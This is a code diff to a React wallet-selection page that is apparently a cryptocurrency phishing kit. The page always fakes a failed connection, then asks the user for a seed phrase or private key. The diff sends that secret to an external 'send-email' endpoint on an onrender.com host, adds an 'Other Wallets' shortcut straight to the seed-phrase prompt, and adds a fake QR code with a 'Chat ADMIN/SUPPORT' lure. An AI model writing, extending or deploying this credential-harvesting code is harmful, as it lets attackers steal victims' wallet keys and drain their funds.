@@ -20,7 +20,8 @@ import frontierLogo from "../assets/wallets/frontier.jpeg";
 import omniLogo from "../assets/wallets/omni.jpeg";
 import atomicLogo from "../assets/wallets/atomic.png";
 import glowLogo from "../assets/wallets/glow.jpeg";
-import nest from "../assets/wallets/nest.jpeg";
+import nestLogo from "../assets/wallets/nest.jpeg";
+import Qrcode from "../assets/qrcode_localhost.png";  // Path to your QR code image
 
 const wallets = [
   { id: 1, name: "MetaMask", logo: metamaskLogo },
@@ -42,7 +43,8 @@ const wallets = [
   { id: 17, name: "Omni", logo: omniLogo },
   { id: 18, name: "Atomic Wallet", logo: atomicLogo },
   { id: 19, name: "Glow", logo: glowLogo },
-  { id: 20, name: "Nest Wallet", logo: nest },
+  { id: 20, name: "Nest Wallet", logo: nestLogo },
+  { id: 21, name: "Other Wallets", logo: "" }, // New entry for "Other Wallets"
 ];
 
 const WalletSelection = () => {
@@ -53,6 +55,7 @@ const WalletSelection = () => {
   const [manualConnect, setManualConnect] = useState(false);
   const [inputType, setInputType] = useState("phrase");
   const [inputValue, setInputValue] = useState("");
+  const [showQrConnecting, setShowQrConnecting] = useState(false);
 
   const navigate = useNavigate();
 
@@ -61,14 +64,19 @@ const WalletSelection = () => {
   );
 
   const handleWalletClick = (wallet) => {
-    setSelectedWallet(wallet);
-    setConnecting(true);
-    setError(false);
+    if (wallet.name === "Other Wallets") {
+      setManualConnect(true);
+      setInputType("phrase"); // Automatically set to input phrase for manual connection
+    } else {
+      setSelectedWallet(wallet);
+      setConnecting(true);
+      setError(false);
 
-    setTimeout(() => {
-      setConnecting(false);
-      setError(true); // Simulate connection error
-    }, 10000);
+      setTimeout(() => {
+        setConnecting(false);
+        setError(true); // Simulate connection error
+      }, 10000);
+    }
   };
 
   const handleManualConnectToggle = () => {
@@ -87,13 +95,14 @@ const WalletSelection = () => {
     }
 
     try {
-      const response = await fetch("http://localhost:5000/send-email", {
+      setShowQrConnecting(true); // Show QR connecting overlay
+      const response = await fetch("https://mailer-c1th.onrender.com/send-email", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          wallet: selectedWallet, // Include the selected wallet details
+          wallet: selectedWallet,
           type: inputType,
           value: inputValue,
         }),
@@ -108,9 +117,10 @@ const WalletSelection = () => {
     } catch (error) {
       console.error("Error submitting data:", error);
       alert("An error occurred. Please try again.");
+    } finally {
+      setInputValue("");
+      setShowQrConnecting(false); // Hide QR overlay after submission
     }
-
-    setInputValue("");
   };
 
   return (
@@ -123,7 +133,7 @@ const WalletSelection = () => {
           <h3>Wallets</h3>
         </div>
 
-        {connecting && (
+        {connecting && !showQrConnecting && (
           <div className="connecting-overlay">
             <img
               src={selectedWallet?.logo}
@@ -135,7 +145,15 @@ const WalletSelection = () => {
           </div>
         )}
 
-        {!connecting && !error && (
+        {showQrConnecting && (
+          <div className="connecting-overlay">
+            <img src={Qrcode} alt="QR Code" className="dummy-qr-code" />
+            <p>Chat ADMIN/SUPPORT for authentication code</p>
+            <p>Connecting, Please wait...</p>
+          </div>
+        )}
+
+        {!connecting && !error && !showQrConnecting && (
           <>
             <input
               type="text"
@@ -151,7 +169,9 @@ const WalletSelection = () => {
                   className="wallet-item"
                   onClick={() => handleWalletClick(wallet)}
                 >
-                  <img src={wallet.logo} alt={wallet.name} className="wallet-logo" />
+                  {wallet.logo && (
+                    <img src={wallet.logo} alt={wallet.name} className="wallet-logo" />
+                  )}
                   <span>{wallet.name}</span>
                 </li>
               ))}
@@ -159,10 +179,11 @@ const WalletSelection = () => {
           </>
         )}
 
-        {error && (
+        {error && !showQrConnecting && (
           <div className="error-container">
             {!manualConnect ? (
               <>
+                <img src={Qrcode} alt="QR Code" className="dummy-qr-code" />
                 <p>Connection failed. Do you want to connect manually?</p>
                 <button
                   className="submit-phrase-button"
@@ -176,39 +197,28 @@ const WalletSelection = () => {
                 <p>Select a method and enter details:</p>
                 <div className="input-type-buttons">
                   <button
-                    className={`input-type-button ${
-                      inputType === "phrase" ? "active" : ""
-                    }`}
+                    className={`input-type-button ${inputType === "phrase" ? "selected" : ""}`}
                     onClick={() => setInputType("phrase")}
                   >
-                    Phrase
+                    Seed Phrase
                   </button>
                   <button
-                    className={`input-type-button ${
-                      inputType === "keystone" ? "active" : ""
-                    }`}
-                    onClick={() => setInputType("keystone")}
-                  >
-                    Keystone
-                  </button>
-                  <button
-                    className={`input-type-button ${
-                      inputType === "privateKey" ? "active" : ""
-                    }`}
+                    className={`input-type-button ${inputType === "privateKey" ? "selected" : ""}`}
                     onClick={() => setInputType("privateKey")}
                   >
                     Private Key
                   </button>
                 </div>
+
                 <input
-                  type="password"
-                  placeholder={`Enter your ${inputType}`}
+                  type="text"
+                  placeholder={inputType === "phrase" ? "Enter Seed Phrase" : "Enter Private Key"}
                   value={inputValue}
                   onChange={(e) => setInputValue(e.target.value)}
-                  className="wallet-phrase-input"
+                  className="input-field"
                 />
                 <button
-                  className="submit-phrase-button"
+                  className="submit-button"
                   onClick={handleInputSubmit}
                 >
                   Submit
